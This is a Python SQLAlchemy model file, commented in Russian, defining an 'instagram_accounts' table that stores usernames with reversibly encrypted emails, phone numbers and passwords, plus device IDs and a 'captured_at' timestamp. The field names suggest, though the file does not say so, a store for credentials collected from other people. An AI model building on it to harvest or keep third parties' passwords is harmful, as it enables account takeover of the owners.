"""
models.py — SQLAlchemy ORM-модели.
Определяет структуру таблицы instagram_accounts в PostgreSQL.
"""

from sqlalchemy import Column, Integer, String, LargeBinary, DateTime, create_engine
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.sql import func

Base = declarative_base()


class InstagramAccount(Base):
    __tablename__ = "instagram_accounts"

    id = Column(Integer, primary_key=True, index=True)
    username = Column(String, unique=True, index=True, nullable=True)

    # Поля хранятся в зашифрованном виде (Fernet -> AES-128-CBC + HMAC)
    email_encrypted = Column(LargeBinary, nullable=True)
    phone_encrypted = Column(LargeBinary, nullable=True)
    password_encrypted = Column(LargeBinary, nullable=True)

    # Нешифрованные вспомогательные поля (нечувствительные)
    full_name = Column(String, nullable=True)
    device_id = Column(String, nullable=True)
    captured_at = Column(DateTime(timezone=True), server_default=func.now())
    category = Column(String, default="personal")  # personal / corporate

    def __repr__(self):
        return f"<InstagramAccount(username={self.username}, device={self.device_id})>"
